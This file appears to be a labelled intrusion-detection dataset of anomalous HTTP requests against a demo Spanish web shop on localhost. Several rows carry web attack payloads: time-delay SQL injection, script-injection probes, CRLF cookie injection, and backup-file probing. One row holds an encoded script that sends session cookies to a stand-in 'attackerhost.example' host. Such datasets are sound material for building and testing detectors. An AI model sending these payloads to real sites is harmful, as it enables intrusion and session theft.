Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,URL,INDEX
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=61A0FC3ABE072163E07470342B3FA1E9,,close,,,http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=27&B1=A%F1adir+al+carrito HTTP/1.1,44010
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6BB170C315450E791AA64CD64FC2B08D,,close,,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,40293
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2DA9FC26A5E1761534347FB7ACE77E1D,,close,,,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif~ HTTP/1.1,38592
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E336D0E9564CA87B217459891910DEE7,,close,,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mccarron&password=revistero&nombre=Adelqui&apellidos=Valente+Sanchis&email=gargen%40007tv.zw&dni=83296238J&direccion=C%2F+Fuente+Morena%2C+146%2C+&ciudad=Rillo&cp=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&provincia=Lleida&ntc=3359754319393302&B1=Registrar HTTP/1.1,37346
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A081909EAE6CDC40EAB6E578C817DE83,,close,,,http://localhost:8080/WebSphereSamples/ HTTP/1.1,56315
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7C7FBEB8786FEC53C882B8800F42C2A9,application/x-www-form-urlencoded,Connection: close,Content-Length: 267,modo=registro&login=glancey&password=filol%F3gicamente&nombre=Yago&apellidos=Bartra+Bergu%EDo&email=kaminski%40lola-lutscht.cf&dni=48258022C&direccion=Chalets+De+La+Tierruca%2C+118+8-F%2520&ciudad=Valls&cp=50691&provincia=Ciudad+Real&ntc=8042027288739194&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,37668
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8C1B2A5D2AD3E14E2C2BE0776CCF0B86,,close,,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,52164
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=927B7930B39D2DDE60EB9B58CAE20C85,application/x-www-form-urlencoded,Connection: close,Content-Length: 5,idA=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,59878
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A94F6E6D7C85E13BCD15DAA9C62DC6D4,application/x-www-form-urlencoded,Connection: close,Content-Length: 81,B2=Vaciar+carritobob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,49961
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=01EF18B1F1FB18110BB9B34AE84AC49B,,close,,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lyliston&pwd=de4454&remember=off&B1A=Entrar HTTP/1.1,42846
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D41199EB20D85DF46F1CC22C5BB29CCF,,close,,,http://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp HTTP/1.1,46924
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CAB1CA12F21AF025ED1C7C17807BE4B7,,close,,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2018&B1=Pasar+por+caja HTTP/1.1,45161
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5191355F0AB1E867E4F4AE11CD469ADD,,close,,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%2520&login=shirai&pwd=3897r%24314m78t8&remember=off&B1=Entrar HTTP/1.1,41098
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2AD378A31C6FAFF53CE24D32F0E3AC6A,,close,,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%2F%2C*stellwag&password=dogal&nombre=Adelmo&apellidos=Jepus+Novas&email=cagney%40hiperespa%F1a.et&dni=99942317A&direccion=Carrer+Sant+Fruitos+1%2C+&ciudad=Riells+i+Viabrea&cp=29410&provincia=M%E1laga&ntc=4452881808901719&B1=Registrar HTTP/1.1,54869
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8A447766BF79DC4DC577754B640DC76F,,close,,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ha*rmony&pwd=ZaRrAm%24pl%EDN&remember=on&B1=Entrar HTTP/1.1,57998
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7BE6DD5CC2BE009C50E096D25560E74F,,close,,,http://localhost:8080/6909030637832563290.jsp.old HTTP/1.1,41554
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5829FA912DD34D3640E349A60DCA1542,,close,,,http://localhost:8080/tienda1/publico/anadir.jsp?idA=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=1&B1=A%F1adir+al+carrito HTTP/1.1,44929
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=174903725618CA8B299D9DB25F512D20,,close,,,http://localhost:8080/dspug.nsf HTTP/1.1,50383
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8AE0E7D4B9F8AA940B7DB4ACCE18B292,application/x-www-form-urlencoded,Connection: close,Content-Length: 267,modo=registro&login=pr*atap&password=anafrodisia&nombre=Melit%F3n&apellidos=Cornell+Alumbrer&email=irawan_hightower%40salsaspain.an&dni=86251880V&direccion=Calle+Javier+Puig%2C+104%2C+&ciudad=Villar+del+Cobo&cp=37256&provincia=Burgos&ntc=3418177143223897&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,41163
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C4AD18A084759ED05B2ED2B8175C1B35,application/x-www-form-urlencoded,Connection: close,Content-Length: 247,modo=registro&login=lynnette&password=do&nombre=Huen%FA&apellidos=Busquet+Ojelja&email=villafane%40digitalcorp.cx&dni=05917539F&direccion=C%2F+%2BHerradura%2C+S%2FN%2C+8H&ciudad=Errigoiti&cp=16193&provincia=Huesca&ntc=9511633114834484&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,45898
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C1BDB7F64AB428E5F4680A9B581CD803,,close,,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%257C HTTP/1.1,51873
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D79EC6836250C64F8EDF48DFD9D9C9FA,,close,,,http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/.old HTTP/1.1,40510
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=54FDF715C7AF7DA19ADEBFE830F14406,,close,,,http://localhost:8080/tienda1/publico/asf-logo-wide HTTP/1.1,46835
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5CF2EA33874FED04DB4D456EA316BDBF,,close,,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=Dulio&apellidos=Ubach+Rodr%EDguez&email=wilmot%40schnaps.com.ne&dni=87584326G&direccion=C%2F+Lara%2C+162+&ciudad=Villanueva+de+Campe%E1n&cp=01423&provincia=Barcelona%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=5124736256894307&B1=Registrar HTTP/1.1,38764
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=332DD1A54D5460A89E2379491C5EC09F,,close,,,http://localhost:8080/tienda1/publico/anadir.jsp.Bak HTTP/1.1,57902
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0652BF10D89F31D9AB8D2BDB6976D6F7,,close,,,http://localhost:8080/iissamples/ExAir/Catalog/Catalog.asp HTTP/1.1,46319
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4B3A28A106301784819DC04A50BD42B2,application/x-www-form-urlencoded,Connection: close,Content-Length: 69,modo=entrar&login=*%2Fvander%27we&pwd=pazguat5&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,36259
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=712792B600CDE906DCCB3DC5DCDD8033,application/x-www-form-urlencoded,Connection: close,Content-Length: 87,id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,56200
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5127E190A9E0EC2B09F39FDD23C2FF66,,close,,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,53178
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=39EDA89014CA31A9CCE7514462E2BE79,,close,,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,37087
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8E8C99984FAA5AAA6A92660D6EB63B3D,,close,,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8137&B1=Pasar+por+caja HTTP/1.1,45875
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BA3E733DF76194C280C5AC742316E823,application/x-www-form-urlencoded,Connection: close,Content-Length: 153,id=1&nombre=Vino+Rioja&precio=100&cantidad=26paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,60058
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F2EE616B5AB42A0082E4250761DD6628,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,errorMsg=Credenciales+incorrectas%2500,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,49694
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=54A1DF522B58E5933519593AD83317CD,,close,,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%22+AND+%221%22%3D%221 HTTP/1.1,56855
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E8A5E7C64EBFEB1415236FE478916870,,close,,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5798&B1=Confirmar%2F HTTP/1.1,53050
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F6D9A159DF504DF8A7CE889975869753,,close,,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=jinsoo&password=hatera&nombre=Babeli&apellidos=Coca&email=mirren.light%40hipereuskadi.no&dni=55444039D&direccion=C%2F+Ciudad+Jardin+108+7-H&ciudad=Valles+de+Palenzuela&cp=22700&provincia=%C1vila&ntc=6005492859075787&B1=Registrar HTTP/1.1,41081
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6E53F803651CEA905CD25C79285E3F79,application/x-www-form-urlencoded,Connection: close,Content-Length: 324,modo=registro&login=visvanat&password=mohatrera&nombre=Helga&apellidos=Peratill&email=hauser%40whitepearlresort.as&dni=88363371Q&direccion=Calle+Sandoval+135%2C+4%3FBbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ciudad=S%E1daba&cp=40183&provincia=Zaragoza&ntc=6865627677043866&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,58866
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EF7F17765821470523ADBBC19230BB82,,close,,,http://localhost:8080/tienda1/publico/caracteristicas.jsp.Old HTTP/1.1,36075
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BCD6B7BD8E14504D48D2BDA802100F8B,application/x-www-form-urlencoded,Connection: close,Content-Length: 97,B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,58994
Anomalous,GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=68331EC96FC8CE85371E02A235146A3B,,close,,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%257C HTTP/1.1,37710
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4760E0B076C18EC00C9E1AB17BC4F502,application/x-www-form-urlencoded,Connection: close,Content-Length: 158,id=1&nombre=Jam%F3n+Ib%E9rico%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=24&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,55990
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1D04A0D18D289016F9BD94B9E726FC7F,application/x-www-form-urlencoded,Connection: close,Content-Length: 251,modo=registro&login=rygwalsk&password=ve50able&nombre=Francisco&apellidos=Pallares+Milara%2500&email=gozzi%40encuentrodominios.at&dni=51556666G&direccion=Pl.+Banco+196%2C+7G&ciudad=Corrales&cp=03187&provincia=La+Rioja&ntc=3169451354292215&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,38173
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4B4B8CF72A7B488CEC28C3A378678DA9,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=7518&B1=Confirmar%2F,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,55908
